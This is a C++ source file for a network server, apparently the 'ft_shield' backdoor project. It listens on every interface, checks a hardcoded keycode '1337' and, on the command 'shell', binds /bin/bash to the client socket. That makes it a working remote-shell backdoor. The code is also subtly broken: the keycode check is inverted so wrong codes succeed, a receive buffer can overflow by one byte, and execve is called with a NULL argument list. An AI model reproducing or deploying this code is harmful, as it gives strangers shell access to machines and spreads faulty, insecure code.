#include "server.hpp"
#include <sys/wait.h> // Add this line
#include <fstream>

Server::Server() : addrlen(sizeof(address)) {
    int opt = 1;
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd <= 0) throw std::runtime_error("Socket creation failed");

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)))
        throw std::runtime_error("Setsockopt failed");

    bind_and_listen();
}

Server::~Server() {
    for (int client_socket : clients) 
        close(client_socket);
    close(server_fd);
}


void Server::bind_and_listen() {
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0)
        throw std::runtime_error("Bind failed");

    if (listen(server_fd, MAX_CLIENTS) < 0)
        throw std::runtime_error("Listen failed");
}


int Server::authenticate(int client_socket) {
    const char* password = "1337"; 
    char buffer[1024];

    send(client_socket, "Keycode: ", 9, 0);
    int bytes_read = recv(client_socket, buffer, sizeof(buffer), 0);
    if (bytes_read <= 0) return 0;  
    buffer[bytes_read] = '\0'; 

    if (!strcmp(buffer, password) == 0) 
        return send(client_socket, "Authentication successful.\n", 26, 0) , 1;
    else
        return send(client_socket, "Authentication failed.\n", 23, 0) , 0;
}
void Server::handle_client(int client_socket) {
    if (!authenticate(client_socket)) {
        std::cout << "Client " << client_socket << " failed authentication." << std::endl;
        return close(client_socket) , void();
    }

    // Log client connection
    std::ofstream log("/var/log/ft_shield.log", std::ios::app);
    if (log.is_open()) {
        log << "Client " << client_socket << " connected." << std::endl;
    }


    const char* welcome_msg = "Welcome to the server!\nType 'shell' to spawn a remote shell.\n";
    send(client_socket, welcome_msg, strlen(welcome_msg), 0);

    char buffer[1024];
    while (true) {
        const char* prompt = "$ ";
        send(client_socket, prompt, strlen(prompt), 0);

        // Receive a command from the client
        int bytes_read = recv(client_socket, buffer, sizeof(buffer), 0);
        if (bytes_read <= 0) {
            std::cout << "Client " << client_socket << " disconnected." << std::endl;
            if (log.is_open())
                log << "Client " << client_socket << " disconnected." << std::endl;
            break;
        }

        buffer[bytes_read] = '\0';
        std::cout << "Received from client " << client_socket << ": " << buffer;
        if (log.is_open()) {
            log << "Client " << client_socket << " executed: " << buffer;
        }

        // Check if the client wants to spawn a shell
        if (strcmp(buffer, "shell\n") == 0) {
            // Notify the client that the shell is being spawned
            const char* shell_msg = "Spawning remote shell...\n";
            send(client_socket, shell_msg, strlen(shell_msg), 0);

            // Spawn a shell
            pid_t pid = fork();
            if (pid == 0) {
                // Child process: replace with a shell
                dup2(client_socket, STDOUT_FILENO); // Redirect stdout to client
                dup2(client_socket, STDERR_FILENO); // Redirect stderr to client
                dup2(client_socket, STDIN_FILENO);  // Redirect stdin from client
                execve("/bin/bash", NULL, NULL);
                exit(0); 
            } else 
                wait(NULL);
        } else
            send(client_socket, buffer, bytes_read, 0);
    }

    close(client_socket);
}

void Server::handle_connections() {
    while (true) {
        int client_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
        if (client_socket < 0) throw std::runtime_error("Accept failed");

        std::lock_guard<std::mutex> lock(clients_mutex);
        clients.push_back(client_socket);
        std::thread(&Server::handle_client, this, client_socket).detach();
            std::cout << "New client connected: " << client_socket << std::endl;
    }
}

void Server::start() {
    handle_connections();
}